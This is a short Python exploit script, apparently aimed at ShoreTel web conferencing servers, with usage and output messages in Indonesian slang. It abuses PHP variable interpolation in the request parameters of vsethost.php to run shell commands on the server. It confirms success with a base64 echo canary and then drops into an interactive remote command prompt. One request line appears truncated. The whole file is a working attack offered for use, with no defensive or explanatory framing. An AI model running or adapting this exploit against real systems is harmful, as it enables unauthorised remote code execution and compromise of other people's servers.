import base64, requests, sys
import readline
def build_shoretel(cmd):
        obj = {
                "hostId": "system",
                "keyCode": "base64_decode",
                "meetingType": "{${gKeyCode}($gSessionDir)}",
                "sessionDir": base64.b64encode(bytes(cmd, "utf-8")).decode("ascii"),
                "swfServer": "{${gHostID}($gMeetingType)}",
                "server": "exec",
                "dir": "/usr/share/apache2/htdocs/wc2_deploy/scripts/"
        }
        return obj

def exploit():
        if len(sys.argv) < 2: sys.exit("Penggunaan: python rce.py https://targetlu.co.li")
        url = sys.argv[1]
        c = requests.get(url+"/scripts/vsethost.php",params = build_shoretel("echo bWVua3JlcDEzMzcK">
        if requests.get(url+"/scripts/vmhost.php").text.strip() == "bWVua3JlcDEzMzcK":
                print("Target PULEN BABI..!!!")
                while True:
                        cmd = input("CMD: ~$ ")
                        requests.get(url+"/scripts/vsethost.php", params = build_shoretel(cmd))
                        c = requests.get(url+"/scripts/vmhost.php")
                        print(c.text if c.text != "" else "No output")
        else:
                print("TargetNya Gk PULEN Goblok..!!")
exploit()
